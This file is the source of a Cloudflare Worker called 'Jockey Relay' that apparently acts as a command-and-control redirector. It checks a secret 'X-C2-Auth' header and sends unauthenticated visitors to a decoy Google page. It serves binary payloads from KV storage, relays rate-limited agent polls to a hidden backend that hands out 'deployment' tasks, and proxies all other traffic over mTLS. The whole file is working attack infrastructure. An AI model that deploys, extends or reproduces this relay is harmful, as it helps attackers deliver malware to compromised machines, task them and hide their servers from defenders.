// ============================================================================
// Jockey Relay — Cloudflare Worker (short-poll)
//   • Auth gate
//   • /payloads/<name>       — serve from KV
//   • /api/v1/agent/poll     — single forward to backend /heartbeat
//   • everything else        — pass-through to manager
// ============================================================================

const DECOY_URL = "https://www.google.com";

export default {
  async fetch(request, env) {
    const authHeader = request.headers.get("X-C2-Auth");
    if (authHeader !== env.C2_AUTH) {
      return new Response(null, {
        status: 302,
        headers: { "Location": DECOY_URL },
      });
    }

    const url  = new URL(request.url);
    const path = url.pathname;

    if (path.startsWith("/payloads/")) {
      const name = path.replace("/payloads/", "");
      const payload = await env.PAYLOAD_KV.get(name, { type: "arrayBuffer" });
      if (!payload) return new Response("Not found", { status: 404 });
      return new Response(payload, {
        headers: {
          "Content-Type": "application/octet-stream",
          "Cache-Control": "no-store",
        },
      });
    }

    if (path === "/api/v1/agent/poll" && request.method === "POST") {
      let body;
      try { body = await request.json(); }
      catch { return json({ error: "invalid json" }, 400); }

      const agentId = body.agent_id;
      if (!agentId) return json({ error: "agent_id required" }, 400);

      const { success } = await env.AGENT_POLL_RATE_LIMITER.limit({
        key: String(agentId),
      });
      if (!success) {
        return json({ error: "poll rate limit exceeded" }, 429);
      }

      try {
        const resp = await backendFetch(env, `${env.BACKEND_URL}/api/v1/agent/heartbeat`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-C2-Auth":     request.headers.get("X-C2-Auth") || "",
          },
          body: JSON.stringify({ agent_id: agentId }),
        });

        if (!resp.ok) {
          return new Response(resp.body, {
            status: resp.status,
            headers: { "Content-Type": "application/json" },
          });
        }

        const data = await resp.json();
        if (data && data.deployment) {
          return json({ status: "ok", deployment: data.deployment }, 200);
        }
        return json({ status: "idle" }, 200);

      } catch (e) {
        return json({ error: "backend unreachable", detail: String(e) }, 503);
      }
    }

    const backendUrl = env.BACKEND_URL + url.pathname + url.search;
    const init = { method: request.method, headers: request.headers };
    if (!["GET", "HEAD"].includes(request.method)) {
      init.body = request.body;
    }
    try { return await backendFetch(env, backendUrl, init); }
    catch { return json({ error: "backend unavailable" }, 503); }
  },
};

function backendFetch(env, resource, init) {
  if (!env.RELAY_MTLS || typeof env.RELAY_MTLS.fetch !== "function") {
    throw new Error("RELAY_MTLS binding is not configured");
  }
  return env.RELAY_MTLS.fetch(resource, init);
}

function json(obj, status = 200) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}